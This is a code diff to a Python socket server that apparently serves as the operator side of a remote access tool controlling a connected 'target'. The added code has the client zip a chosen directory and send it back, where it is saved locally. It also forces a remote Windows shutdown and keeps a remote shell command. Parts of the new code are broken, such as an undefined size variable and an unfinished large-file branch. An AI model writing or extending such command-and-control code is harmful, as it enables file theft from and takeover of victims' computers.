@@ -31,7 +31,7 @@ class Server:
 
         self.connections = []  # connections list
         self.info = ""  # info about target
-        # self.recvcounter = 0  # counter for received files
+        self.recvcounter = 0  # counter for received files
 
         self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -63,9 +63,70 @@ class Server:
         self.client_socket.send(msg.encode())
         print(msg)
         results = (self.client_socket.recv(self.BUFFER_SIZE).decode())
+        print(results)
 
-        # print them
-        # # print("goes wrong before here? ")
+    def oncoDLF(self):
+
+        command = "sendZip"
+        self.client_socket.send(command.encode("utf-8"))
+
+        path = input("[+] Enter path (NOT A SINGLE FILE): ")
+        self.client_socket.send(path.encode("utf-8"))
+
+        response = self.client_socket.recv(self.BUFFER_SIZE)
+        if response.decode("utf-8") == "Success":
+            # recv size
+            size = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
+            time.sleep(0.1)
+
+            if int(size) <= self.BUFFER_SIZE:
+                # recv archive
+                archive = self.client_socket.recv(self.BUFFER_SIZE)
+                print("*** Got file ***")
+
+                with open(f'../receivedfile/received{str(self.recvcounter)}.zip', 'wb+') as output:
+                    output.write(archive)
+
+                print("*** File saved ***")
+                self.recvcounter += 1
+
+            else:  # # TODO For a VERY LARGE FILE
+                print("very large file")
+                '''Do this'''
+                # Update Buffer Size, Save Big File  Then continue as above
+        else:
+            print("failed")
+            print(response.decode("utf-8"))
+            # print them
+            # # print("goes wrong before here? ")
+
+
+    def zipF(self):
+        command = "sendZip"
+        self.client_socket.send(command.encode())
+        fp = input("[+] What is the filepath?: ")
+        self.client_socket.send(fp.encode())
+        results = (self.client_socket.recv(self.BUFFER_SIZE).decode())
+        print(results)
+        # update buffer
+        buff = self.updateBuffer(size)
+
+        # recv archive
+        fullarchive = self.saveBigFile(int(size), buff)
+
+        print("*** Got file *** ")
+        with open(f'../receivedfile/received{str(self.recvcounter)}.zip', 'wb+') as output:
+            output.write(fullarchive)
+
+        print("*** File saved ***")
+        self.recvcounter += 1
+
+    def shutdown(self):
+        command = "shutdown /s"
+        self.client_socket.send(command.encode("utf-8"))
+
+        self.client_socket.close()
+        print(f"[!] {self.address[0]} has been Shut Down")
 
     def commands(self):
 
@@ -88,6 +149,13 @@ class Server:
 
             elif command == "shell":
                 self.cmdctrl()
+            elif command == "sendZip":
+                self.oncoDLF()
+            elif command == "shutdown":
+                self.shutdown()
+            elif command == "disconn":
+                self.client_socket.send(command.encode("utf-8"))
+                print("*** Killed")
             else:
                 print("No Valid Command Received")
         sys.exit()
@@ -97,6 +165,11 @@ class Server:
         self.close()
 
         print(results)
+
+    def disconn(self):
+        command = "disconnect"
+        self.client_socket.send(command.encode("utf-8"))
+        print("*** Killed")
 
     def cmdctrl(self):
         """ This is not a real interactive shell, you get the output
@@ -131,7 +204,15 @@ class Server:
 
             print(output.decode("utf-8"))
 
-
+    def printOptions():
+        '''
+        msg
+        shell
+        sendZip
+        shutdown
+        disconnect
+        getInfo
+        '''
 
 
 def main():
